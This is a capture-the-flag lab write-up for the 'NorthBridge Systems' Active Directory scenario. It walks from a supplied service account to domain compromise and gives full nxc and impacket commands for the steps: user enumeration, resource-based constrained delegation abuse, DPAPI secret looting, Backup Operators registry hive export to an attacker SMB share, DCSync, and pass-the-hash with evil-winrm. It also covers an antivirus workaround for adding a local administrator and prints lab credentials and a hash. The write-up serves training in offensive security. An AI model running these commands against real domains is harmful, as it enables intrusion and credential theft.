

# Scope & Objective

> NorthBridge Systems is a managed service provider that has engaged the Hack Smarter Red Team to perform a security assessment against a portion of their environment. The assessment is to be conducted from an assumed breach perspective, as you have been provided credentials for a dedicated service account created specifically for this engagement.
> 
> 
> Your point of contact at NorthBridge Systems has authorized testing on the following hosts. Any host outside this scope is considered out of scope and should not be accessed.
> 
> - NORTHDC01 (Domain controller)
> - NORTHJMP01 (Jump box user by the IT team)
> 
> The primary objective of the security assessment is to compromise the domain controller (NORTHDC01) in order to demonstrate the effectiveness (or lack thereof) of the recent security hardening activities.
> 
> To track your progress in the assessment, there are flags located at C:\Users\Administrator\Desktop on each host.
> 
> As you progress through the environment, make sure to document these flags so your point of contact knows you have compromised the environment.
> 
> Your success in this assessment will directly inform their future cybersecurity budget! No pressure!
> 

Starting Credentials:

```fortran
_securitytestingsvc:4kCc$A@NZvNAdK@
```

---

# Enumeration

## Nmap

### **NORTHDC01**

```fortran
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 126 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2025-11-20 15:55:20Z)
135/tcp   open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: northbridge.corp0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 126
464/tcp   open  kpasswd5?     syn-ack ttl 126
593/tcp   open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: northbridge.corp0., Site: Default-First-Site-Name)
3268/tcp  open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: northbridge.corp0., Site: Default-First-Site-Name)
3269/tcp  open  ssl/ldap      syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: northbridge.corp0., Site: Default-First-Site-Name)
3389/tcp  open  ms-wbt-server syn-ack ttl 126 Microsoft Terminal Services
|_ssl-date: 2025-11-20T15:56:55+00:00; -2s from scanner time.
| rdp-ntlm-info:
|   Target_Name: NORTHBRIDGE
|   NetBIOS_Domain_Name: NORTHBRIDGE
|   NetBIOS_Computer_Name: NORTHDC01
|   DNS_Domain_Name: northbridge.corp
|   DNS_Computer_Name: NORTHDC01.northbridge.corp
|   Product_Version: 10.0.20348
|_  System_Time: 2025-11-20T15:56:16+00:00
| ssl-cert: Subject: commonName=NORTHDC01.northbridge.corp
| Issuer: commonName=NORTHDC01.northbridge.corp
5357/tcp  open  http          syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
5985/tcp  open  http          syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
50467/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
56499/tcp open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
56511/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
56527/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
56542/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
```

### **NORTHJMP01**

```fortran
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=NORTHJMP01.northbridge.corp
| Not valid before: 2025-09-20T02:38:29
|_Not valid after:  2026-03-22T02:38:29
| rdp-ntlm-info:
|   Target_Name: NORTHBRIDGE
|   NetBIOS_Domain_Name: NORTHBRIDGE
|   NetBIOS_Computer_Name: NORTHJMP01
|   DNS_Domain_Name: northbridge.corp
|   DNS_Computer_Name: NORTHJMP01.northbridge.corp
|   DNS_Tree_Name: northbridge.corp
|   Product_Version: 10.0.20348
|_  System_Time: 2025-11-20T16:14:57+00:00
|_ssl-date: 2025-11-20T16:15:37+00:00; -1s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| smb2-time:
|   date: 2025-11-20T16:14:58
|_  start_date: N/A
```

### /etc/hosts

```fortran
10.1.214.84 NORTHJMP01.northbridge.corp NORTHJMP01
10.1.196.97 NORTHDC01.northbridge.corp NORTHDC01 northbridge.corp
```

---

## Initial Cred Validation (SMB)

```fortran
┌──(root㉿BermudaDark)-[/home/cthulhu/hacksmarter/northbridge-systems]
└─# nxc smb targets.txt -u '_securitytestingsvc' -p '4kCc$A@NZvNAdK@'
SMB         10.1.214.84     445    NORTHJMP01       [*] Windows Server 2022 Build 20348 x64 (name:NORTHJMP01) (domain:northbridge.corp) (signing:True) (SMBv1:None)
SMB         10.1.196.97     445    NORTHDC01        [*] Windows Server 2022 Build 20348 x64 (name:NORTHDC01) (domain:northbridge.corp) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.1.214.84     445    NORTHJMP01       [+] northbridge.corp\_securitytestingsvc:4kCc$A@NZvNAdK@
SMB         10.1.196.97     445    NORTHDC01        [+] northbridge.corp\_securitytestingsvc:4kCc$A@NZvNAdK@
Running nxc against 2 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00

```

`Null Auth:True` flag is set. This means the user can log in via null session (without a username or password) to authenticate.

Tried to enumerate shares via null session, and got the `STATUS_ACCESS_DENIED`

### User Enumeration

We can try to enumerate users

```fortran
┌──(root㉿BermudaDark)-[/home/cthulhu/hacksmarter/northbridge-systems]
└─# nxc smb targets.txt -u '_securitytestingsvc' -p '4kCc$A@NZvNAdK@' --users
SMB         10.1.214.84     445    NORTHJMP01       [*] Windows Server 2022 Build 20348 x64 (name:NORTHJMP01) (domain:northbridge.corp) (signing:True) (SMBv1:None)
SMB         10.1.196.97     445    NORTHDC01        [*] Windows Server 2022 Build 20348 x64 (name:NORTHDC01) (domain:northbridge.corp) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.1.214.84     445    NORTHJMP01       [+] northbridge.corp\_securitytestingsvc:4kCc$A@NZvNAdK@
SMB         10.1.196.97     445    NORTHDC01        [+] northbridge.corp\_securitytestingsvc:4kCc$A@NZvNAdK@
SMB         10.1.196.97     445    NORTHDC01        -Username-                    -Last PW Set-       -BadPW- -Description-
SMB         10.1.196.97     445    NORTHDC01        Administrator                 2025-11-12 21:50:09 0       Built-in account for administering the computer/domain
SMB         10.1.196.97     445    NORTHDC01        Guest                         <never>             0       Built-in account for guest access to the computer/domain
SMB         10.1.196.97     445    NORTHDC01        krbtgt                        2025-09-21 01:35:16 0       Key Distribution Center Service Account
SMB         10.1.196.97     445    NORTHDC01        cfullerT2                     2025-09-21 01:45:44 0       DO NOT CHANGE PASSWORD -- MANAGED BY PAM
SMB         10.1.196.97     445    NORTHDC01        csmithT2                      2025-09-21 01:46:39 0       DO NOT CHANGE PASSWORD -- MANAGED BY PAM
SMB         10.1.196.97     445    NORTHDC01        erhodesT0                     2025-09-21 01:47:09 0       DO NOT CHANGE PASSWORD -- MANAGED BY PAM
SMB         10.1.196.97     445    NORTHDC01        gcookT1                       2025-09-21 01:47:39 0       DO NOT CHANGE PASSWORD -- MANAGED BY PAM
SMB         10.1.196.97     445    NORTHDC01        mleeT1                        2025-09-21 01:48:09 0       DO NOT CHANGE PASSWORD -- MANAGED BY PAM
SMB         10.1.196.97     445    NORTHDC01        rhallT1                       2025-09-21 01:48:37 0       DO NOT CHANGE PASSWORD -- MANAGED BY PAM
SMB         10.1.196.97     445    NORTHDC01        smccormickT1                  2025-09-21 01:49:09 0       DO NOT CHANGE PASSWORD -- MANAGED BY PAM
SMB         10.1.196.97     445    NORTHDC01        vmitchellT2                   2025-09-21 01:49:37 0       DO NOT CHANGE PASSWORD -- MANAGED BY PAM
SMB         10.1.196.97     445    NORTHDC01        jgoodman                      2025-09-21 01:51:09 0
SMB         10.1.196.97     445    NORTHDC01        mlee                          2025-09-21 01:51:54 0
SMB         10.1.196.97     445    NORTHDC01        smccormick                    2025-09-21 01:52:40 0
SMB         10.1.196.97     445    NORTHDC01        bsandersen                    2025-09-21 01:53:32 0
SMB         10.1.196.97     445    NORTHDC01        cfuller                       2025-09-21 01:54:04 0
SMB         10.1.196.97     445    NORTHDC01        csmith                        2025-09-21 01:54:33 0
SMB         10.1.196.97     445    NORTHDC01        vmitchell                     2025-09-21 01:55:11 0
SMB         10.1.196.97     445    NORTHDC01        awilliams                     2025-09-21 01:57:14 0
SMB         10.1.196.97     445    NORTHDC01        erhodes                       2025-09-21 01:57:44 0
SMB         10.1.196.97     445    NORTHDC01        gcook                         2025-09-21 01:58:11 0
SMB         10.1.196.97     445    NORTHDC01        rhall                         2025-09-21 01:58:37 0
SMB         10.1.196.97     445    NORTHDC01        _backupsvc                    2025-09-21 02:00:44 0
SMB         10.1.196.97     445    NORTHDC01        _securitytestingsvc           2025-09-21 02:01:19 0       2025 - Used to support third-party security assessments. Owner, Samantha McCormick
SMB         10.1.196.97     445    NORTHDC01        _svrautomationsvc             2025-09-21 02:01:45 0
SMB         10.1.196.97     445    NORTHDC01        [*] Enumerated 25 local users: NORTHBRIDGE

```

There is a PAM running, and all the users receiving its protection. We can assume these accounts are either local admins, domain admins, or higher-privileged/sensitive accounts. 

> Password Access Management - A security solution that is designed to control, monitor, and secure privileged accounts. Passwords are often rotated regularly.
> 

All in all, we do have a valid list of users on the domain. 

```fortran
Administrator
Guest
krbtgt
cfullerT2
csmithT2
erhodesT0
gcookT1
mleeT1
rhallT1
smccormickT1
vmitchellT2
jgoodman
mlee
smccormick
bsandersen
cfuller
csmith
vmitchell
awilliams
erhodes
gcook
rhall
_backupsvc
_securitytestingsvc
_svrautomationsvc
```

### Password Policy

Taking a look at the password policy:

```fortran
┌──(root㉿BermudaDark)-[/home/cthulhu/hacksmarter/northbridge-systems]
└─# nxc smb targets.txt -u '_securitytestingsvc' -p '4kCc$A@NZvNAdK@' --pass-pol
SMB         10.1.214.84     445    NORTHJMP01       [*] Windows Server 2022 Build 20348 x64 (name:NORTHJMP01) (domain:northbridge.corp) (signing:True) (SMBv1:None)
SMB         10.1.196.97     445    NORTHDC01        [*] Windows Server 2022 Build 20348 x64 (name:NORTHDC01) (domain:northbridge.corp) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.1.214.84     445    NORTHJMP01       [+] northbridge.corp\_securitytestingsvc:4kCc$A@NZvNAdK@
SMB         10.1.196.97     445    NORTHDC01        [+] northbridge.corp\_securitytestingsvc:4kCc$A@NZvNAdK@
SMB         10.1.196.97     445    NORTHDC01        [+] Dumping password info for domain: NORTHBRIDGE
SMB         10.1.196.97     445    NORTHDC01        Minimum password length: 7
SMB         10.1.196.97     445    NORTHDC01        Password history length: 24
SMB         10.1.196.97     445    NORTHDC01        Maximum password age: 41 days 23 hours 53 minutes
SMB         10.1.196.97     445    NORTHDC01
SMB         10.1.196.97     445    NORTHDC01        Password Complexity Flags: 000001
SMB         10.1.196.97     445    NORTHDC01            Domain Refuse Password Change: 0
SMB         10.1.196.97     445    NORTHDC01            Domain Password Store Cleartext: 0
SMB         10.1.196.97     445    NORTHDC01            Domain Password Lockout Admins: 0
SMB         10.1.196.97     445    NORTHDC01            Domain Password No Clear Change: 0
SMB         10.1.196.97     445    NORTHDC01            Domain Password No Anon Change: 0
SMB         10.1.196.97     445    NORTHDC01            Domain Password Complex: 1
SMB         10.1.196.97     445    NORTHDC01
SMB         10.1.196.97     445    NORTHDC01        Minimum password age: 1 day 4 minutes
SMB         10.1.196.97     445    NORTHDC01        Reset Account Lockout Counter: 10 minutes
SMB         10.1.196.97     445    NORTHDC01        Locked Account Duration: 10 minutes
SMB         10.1.196.97     445    NORTHDC01        Account Lockout Threshold: None
SMB         10.1.196.97     445    NORTHDC01        Forced Log off Time: Not Set
Running nxc against 2 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

There is no lockout threshold, in case we need to do any type of password spraying or credential stuffing. 

### User `erhodesT0` has the `STATUS_ACCOUNT_RESTRICTION` flag set

> For the account **`erhodesT0`**, this restriction is typically one of the following:
> 
> 1. **Account Disabled:** The account is simply disabled.
> 2. **Logon Hour Restrictions:** The user is only allowed to log on during certain hours.
> 3. **Workstation Restriction:** The user is only allowed to log on from specific computers (e.g., this IP/host is not permitted).
> 4. **Expired Account:** The account's expiration date has passed.

### Enumerating Shares

```fortran
┌──(root㉿BermudaDark)-[/home/cthulhu/hacksmarter/northbridge-systems]
└─# nxc smb targets.txt -u '_securitytestingsvc' -p '4kCc$A@NZvNAdK@' --shares
SMB         10.1.214.84     445    NORTHJMP01       [*] Windows Server 2022 Build 20348 x64 (name:NORTHJMP01) (domain:northbridge.corp) (signing:True) (SMBv1:None)
SMB         10.1.196.97     445    NORTHDC01        [*] Windows Server 2022 Build 20348 x64 (name:NORTHDC01) (domain:northbridge.corp) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.1.214.84     445    NORTHJMP01       [+] northbridge.corp\_securitytestingsvc:4kCc$A@NZvNAdK@
SMB         10.1.196.97     445    NORTHDC01        [+] northbridge.corp\_securitytestingsvc:4kCc$A@NZvNAdK@
SMB         10.1.214.84     445    NORTHJMP01       [*] Enumerated shares
SMB         10.1.214.84     445    NORTHJMP01       Share           Permissions     Remark
SMB         10.1.214.84     445    NORTHJMP01       -----           -----------     ------
SMB         10.1.214.84     445    NORTHJMP01       ADMIN$                          Remote Admin
SMB         10.1.214.84     445    NORTHJMP01       C$                              Default share
SMB         10.1.214.84     445    NORTHJMP01       IPC$            READ            Remote IPC
SMB         10.1.214.84     445    NORTHJMP01       Network Shares  READ
SMB         10.1.196.97     445    NORTHDC01        [*] Enumerated shares
SMB         10.1.196.97     445    NORTHDC01        Share           Permissions     Remark
SMB         10.1.196.97     445    NORTHDC01        -----           -----------     ------
SMB         10.1.196.97     445    NORTHDC01        ADMIN$                          Remote Admin
SMB         10.1.196.97     445    NORTHDC01        C$                              Default share
SMB         10.1.196.97     445    NORTHDC01        IPC$            READ            Remote IPC
SMB         10.1.196.97     445    NORTHDC01        NETLOGON        READ            Logon server share
SMB         10.1.196.97     445    NORTHDC01        SYSVOL          READ            Logon server share
```

We do find a share called `Network Shares` we can access

## Network Shares

```fortran
# Share Structure

Archive
	backup.bat
Security
	Get-DomainObjectDACL.ps1
	PingCastle_3.4.1.38
	PingCastle_3.4.1.38.zip
	sm
			'sam scratchpad.txt'
Service Desk
	'Onboarding Checklist.txt'
	'Password reset instructions.txt'
Wintel Engineering
	'ADCS Review'
			EmilyTest2025.txt
			NorthDomainControllerAuth.txt
			NorthbridgeMachineAuth.txt
	Microsoft.Active.Directory.Management.dll
	'Privileged accounts notes.txt'
```

I wont post everything I came across while enumerating the share. However, I will say that there were quite a few rabbit holes here. 

Last ditch effort, we notice that port 3389 is enabled. I went ahead and booted up bloodhound and ran remmina for RDP as _securitytestingsvc

### Quick BloodHound Analysis for _securitytestingsvc

Run a collector of your choosing and launch bloodhound. I’ll use rusthound here:

```fortran
rusthound-ce --domain northbridge.corp -f northdc01.northbridge.corp -u '_securitytestingsvc' -p '4kCc$A@NZvNAdK@'
```

We don’t find any potential paths or Outbound controls that interest us and no interesting groups for our initial user. Let’s move on…

## RDP as `_securitytestingsvc`

We are able to RDP into the Jump Box as our initial user _securitytestingsvc

![image.png](/assets/northbridge_img/image.png)

Enumerating the File Explorer, we come across the `scripts` directory with some interesting findings.

### AD domain Backup

![image.png](/assets/northbridge_img/d2c85e18-f30d-4693-ba14-99069b4326c0.png)

We have a powershell script meant to streamline Active Directory Backups and was updated to replace hardcoded credentials. It also iterates how the password file is generated. 

However, what’s more interesting to us are the plaintext creds found in the Server Build Automation Directory!

### Plaintext Credentials for _svrautomationsvc Service Account

![image.png](/assets/northbridge_img/image%201.png)

![image.png](/assets/northbridge_img/image%202.png)

We can try validating this using `nxc`:

```fortran
┌──(root㉿BermudaDark)-[/home/cthulhu/hacksmarter/northbridge-systems]
└─# nxc smb targets.txt -u '_svrautomationsvc' -p 'y...'
SMB         10.1.214.84     445    NORTHJMP01       [*] Windows Server 2022 Build 20348 x64 (name:NORTHJMP01) (domain:northbridge.corp) (signing:True) (SMBv1:None)
SMB         10.1.196.97     445    NORTHDC01        [*] Windows Server 2022 Build 20348 x64 (name:NORTHDC01) (domain:northbridge.corp) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.1.214.84     445    NORTHJMP01       [+] northbridge.corp\_svrautomationsvc:y...
SMB         10.1.196.97     445    NORTHDC01        [+] northbridge.corp\_svrautomationsvc:y...
Running nxc against 2 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

## Bloodhound Analysis : _svrautomationsvc

![image.png](/assets/northbridge_img/image%203.png)

### WriteAccountRestrictions

> The user `_svrautomationsvc` has the ability to **write to or modify the access control settings** on the target computer account (`NORTHJMP01`)
In short, this privilege allows the service account to **change the security settings** of the jump server, potentially granting itself, or any other user, more powerful access to that computer.
> 

# The Attack: Unconstrained Delegation (RBCD)

> We’ll attempt is a classic **Delegation Attack** known as **Resource-Based Constrained Delegation (RBCD)**.
> 

First, we need to create a new computer account

```fortran
┌──(root㉿BermudaDark)-[/home/cthulhu/hacksmarter/northbridge-systems]
└─# impacket-addcomputer -method LDAPS -computer-name 'SRV-FAKE$' -computer-pass 'Bermuda123@' -dc-host NORTHDC01 -domain-netbios NORTHBRIDGE 'northbridge.corp/_svrautomationsvc:yf......Vv'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[-] User _svrautomationsvc machine quota exceeded!
```

This simply means the command was successful, however, the user has exceeded their security limit. We need to find the OU in which our user has delegated rights in creating additional computer accounts.

The readme we found gave us various hints using the keywords “Server Provisioning”. I took a look at bloodhound and found this OU:

```fortran
"OU=ServerProvisioning,OU=Servers,DC=northbridge,DC=corp"
```

```fortran
┌──(root㉿BermudaDark)-[/home/cthulhu/hacksmarter/northbridge-systems]
└─# impacket-addcomputer -method LDAPS -computer-name 'SRV-FAKE$' -computer-pass 'Bermuda123@' -dc-host NORTHDC01 -domain-netbios NORTHBRIDGE 'northbridge.corp/_svrautomationsvc:yf.....Vv' -computer-group 'OU=ServerProvisioning,OU=Servers,DC=northbridge,DC=corp'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Successfully added machine account SRV-FAKE$ with password Bermuda123@.
```

We can now run an RBCD Attack:

```fortran
┌──(root㉿BermudaDark)-[/home/cthulhu/hacksmarter/northbridge-systems]
└─# impacket-rbcd -delegate-from 'SRV-FAKE$' -delegate-to 'NORTHJMP01$' -action 'write' 'northbridge.corp/_svrautomationsvc:y...'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] SRV-FAKE$ can now impersonate users on NORTHJMP01$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     SRV-FAKE$    (S-1-5-21-1010595023-1608570688-3264491749-3601)
```

We can then grab the TGT for the service name we want. Now, testing this against a domain admin will fail due to kerberos delegation protection. 

We can try this against any one of the local admin users part of the `NORTHJMP01PRIV` group. 

There’s 4 local admins. Just pick one and test:

```fortran
┌──(root㉿BermudaDark)-[/home/cthulhu/hacksmarter/northbridge-systems]
└─# impacket-getST -spn "cifs/NORTHJMP01.northbridge.corp" -impersonate GCOOKT1 'northbridge.corp/SRV-FAKE$:Bermuda123@' -dc-ip 10.1.196.97
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating GCOOKT1
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in GCOOKT1@cifs_NORTHJMP01.northbridge.corp@NORTHBRIDGE.CORP.ccache                                                    

┌──(root㉿BermudaDark)-[/home/cthulhu/hacksmarter/northbridge-systems]
└─# export KRB5CCNAME=GCOOKT1@cifs_NORTHJMP01.northbridge.corp@NORTHBRIDGE.CORP.ccache

┌──(root㉿BermudaDark)-[/home/cthulhu/hacksmarter/northbridge-systems]
└─# nxc smb targets.txt -u GCOOKT1 -k --use-kcache
SMB         10.1.214.84     445    NORTHJMP01       [*] Windows Server 2022 Build 20348 x64 (name:NORTHJMP01) (domain:northbridge.corp) (signing:True) (SMBv1:None)
SMB         10.1.196.97     445    NORTHDC01        [*] Windows Server 2022 Build 20348 x64 (name:NORTHDC01) (domain:northbridge.corp) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.1.214.84     445    NORTHJMP01       [+] northbridge.corp\GCOOKT1 from ccache (Pwn3d!)
SMB         10.1.196.97     445    NORTHDC01        [-] northbridge.corp\GCOOKT1 from ccache KDC_ERR_PREAUTH_FAILED
Running nxc against 2 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

We got a hit!

## Dumping the Data Protection API : _backupsvc Credentials Recovered

We can try dumping the LSASS (Local Security Authority Subsystem Service) or DPAPI (Data Protection API) 

```fortran
┌──(root㉿BermudaDark)-[/home/cthulhu/hacksmarter/northbridge-systems]
└─# nxc smb targets.txt -u GCOOKT1 -k --use-kcache -M lsassy
SMB         10.1.214.84     445    NORTHJMP01       [*] Windows Server 2022 Build 20348 x64 (name:NORTHJMP01) (domain:northbridge.corp) (signing:True) (SMBv1:None)
SMB         10.1.196.97     445    NORTHDC01        [*] Windows Server 2022 Build 20348 x64 (name:NORTHDC01) (domain:northbridge.corp) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.1.214.84     445    NORTHJMP01       [+] northbridge.corp\GCOOKT1 from ccache (Pwn3d!)
LSASSY      10.1.214.84     445    NORTHJMP01       [-] Couldn't connect to remote host
SMB         10.1.196.97     445    NORTHDC01        [-] northbridge.corp\GCOOKT1 from ccache KDC_ERR_PREAUTH_FAILED
Running nxc against 2 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

Dumping the LSASS didn’t work, but we did get a hit from DPAPI dump!!

```fortran
┌──(root㉿BermudaDark)-[/home/cthulhu/hacksmarter/northbridge-systems]
└─# nxc smb targets.txt -u GCOOKT1 -k --use-kcache --dpapi
SMB         10.1.196.97     445    NORTHDC01        [*] Windows Server 2022 Build 20348 x64 (name:NORTHDC01) (domain:northbridge.corp) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.1.214.84     445    NORTHJMP01       [*] Windows Server 2022 Build 20348 x64 (name:NORTHJMP01) (domain:northbridge.corp) (signing:True) (SMBv1:None)
SMB         10.1.196.97     445    NORTHDC01        [-] northbridge.corp\GCOOKT1 from ccache KDC_ERR_PREAUTH_FAILED
SMB         10.1.214.84     445    NORTHJMP01       [+] northbridge.corp\GCOOKT1 from ccache (Pwn3d!)
SMB         10.1.214.84     445    NORTHJMP01       [*] Collecting DPAPI masterkeys, grab a coffee and be patient...
SMB         10.1.214.84     445    NORTHJMP01       [+] Got 64 decrypted masterkeys. Looting secrets...
**SMB         10.1.214.84     445    NORTHJMP01       [SYSTEM][CREDENTIAL] Domain:batch=TaskScheduler:Task:{749E95F2-638A-4C24-B478-22FB7A4BED13} - NORTHBRIDGE\_backupsvc:j...5**
Running nxc against 2 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

```fortran
_backupsvc : j......5
```

Now, Backup operators are notorious for having insane privileges on AD. 

## Privilege Escalation : Utilizing Backup Operator Privileges to Extract SAM,SYSTEM,SECURITY Hives

[Backup Operator Privilege Escalation < BorderGate](https://www.bordergate.co.uk/backup-operator-privilege-escalation/)

This link provides a way to remotely save the SAM,SYSTEM,SECURITY files to a remote share of your making.north

We start by creating a share and starting an smb server

```fortran
impacket-smbserver loot /home/cthulhu/hacksmarter/northbridge-systems -smb2support
```

```fortran
┌──(root㉿BermudaDark)-[/home/cthulhu/hacksmarter/northbridge-systems]
└─# impacket-reg _backupsvc:'j......5'@10.1.196.97 backup -o '\\10.200.20.198\loot\'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[!] Cannot check RemoteRegistry status. Triggering start trough named pipe...
[*] Saved HKLM\SAM to \\10.200.20.198\loot\\SAM.save
[*] Saved HKLM\SYSTEM to \\10.200.20.198\loot\\SYSTEM.save
[*] Saved HKLM\SECURITY to \\10.200.20.198\loot\\SECURITY.save
```

## Dumping Local SAM

```fortran
┌──(root㉿BermudaDark)-[/home/cthulhu/hacksmarter/northbridge-systems]
└─# impacket-secretsdump -sam SAM.save -security SECURITY.save -system SYSTEM.save LOCAL
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0x3e0eb193a4a162929f6e25fc2644e31d
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:a......e:1......8:::
...
...
```

The hashes are local, but we are able to get the DC account hash here:

```fortran
$MACHINE.ACC: a...e:7...6
```

# DCSync Attack : Domain Dump, Machine Pwn3d

[Using Domain Controller Account Passwords To HashDump Domains](https://malicious.link/posts/2015/using-domain-controller-account-passwords-to-hashdump-domains/)

This link shows how to dump the NTDS.dit after you’ve gained control of the DC’s hash!

```fortran
 impacket-secretsdump -hashes [redacted:redacted] -just-dc NORTHBRIDGE/'NORTHDC01$'@10.1.196.97
```

![image.png](/assets/northbridge_img/image%204.png)

```fortran
┌──(root㉿BermudaDark)-[/home/cthulhu/hacksmarter/northbridge-systems]
└─# evil-winrm -i NORTHDC01 -u Administrator -H '8b61f9dfb32c8209f4ac9e2a5c2269cc'

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
northbridge\administrator
```

## Getting the User Flag & Bypassing the AV

I ended up skipping this step and going right into dumping the DPAPI, but here are the steps I took to get the user flag. 

Initially, I tried to login using GCOOKT1’s exported TGT via win-rm, but wasn’t getting anywhere. 

Then it hit me, netexec can run system commands!

```fortran
┌──(root㉿BermudaDark)-[/home/cthulhu/hacksmarter/northbridge-systems]
└─# nxc smb NORTHJMP01 -u GCOOKT1 -k --use-kcache -X "pwd"
SMB         NORTHJMP01      445    NORTHJMP01       [*] Windows Server 2022 Build 20348 x64 (name:NORTHJMP01) (domain:northbridge.corp) (signing:True) (SMBv1:None)
SMB         NORTHJMP01      445    NORTHJMP01       [+] northbridge.corp\GCOOKT1 from ccache (Pwn3d!)
SMB         NORTHJMP01      445    NORTHJMP01       [-] wmiexec: Could not retrieve output file, it may have been detected by AV. If it is still failing, try the 'wmi' protocol or another exec method
SMB         NORTHJMP01      445    NORTHJMP01       [+] Executed command via wmiexec
```

But then we got caught by the AV.

According to ChatGPT (yes :(( I used it here), you can add an existing user to the admins group through netexec!

```fortran
┌──(root㉿BermudaDark)-[/home/cthulhu/hacksmarter/northbridge-systems]
└─# nxc smb NORTHJMP01 -u GCOOKT1 -k --use-kcache -X "net localgroup Administrators 'northbridge.corp\_securitytestingsvc' /add"
SMB         NORTHJMP01      445    NORTHJMP01       [*] Windows Server 2022 Build 20348 x64 (name:NORTHJMP01) (domain:northbridge.corp) (signing:True) (SMBv1:None)
SMB         NORTHJMP01      445    NORTHJMP01       [+] northbridge.corp\GCOOKT1 from ccache (Pwn3d!)
SMB         NORTHJMP01      445    NORTHJMP01       [-] wmiexec: Could not retrieve output file, it may have been detected by AV. If it is still failing, try the 'wmi' protocol or another exec method
SMB         NORTHJMP01      445    NORTHJMP01       [+] Executed command via wmiexec
```

And it gets caught again…

Seems like tools like `net.exe` are being monitored. We need another powershell command that’s not being monitored. Had ChatGPT give me this alternative:

```fortran
┌──(root㉿BermudaDark)-[/home/cthulhu/hacksmarter/northbridge-systems]
└─# nxc smb NORTHJMP01 -u GCOOKT1 -k --use-kcache -X "Add-LocalGroupMember -Group Administrators -Member '_securitytestingsvc@northbridge.corp'"
SMB         NORTHJMP01      445    NORTHJMP01       [*] Windows Server 2022 Build 20348 x64 (name:NORTHJMP01) (domain:northbridge.corp) (signing:True) (SMBv1:None)
SMB         NORTHJMP01      445    NORTHJMP01       [+] northbridge.corp\GCOOKT1 from ccache (Pwn3d!)
SMB         NORTHJMP01      445    NORTHJMP01       [+] Executed command via wmiexec
SMB         NORTHJMP01      445    NORTHJMP01       #< CLIXML
SMB         NORTHJMP01      445    NORTHJMP01       <Objs ....................>
```

This one works!!!

Just run an evil-winrm and grab the user flag

```fortran
evil-winrm -i NORTHJMP01 -u _securitytestingsvc -p '4kCc$A@NZvNAdK@'
```
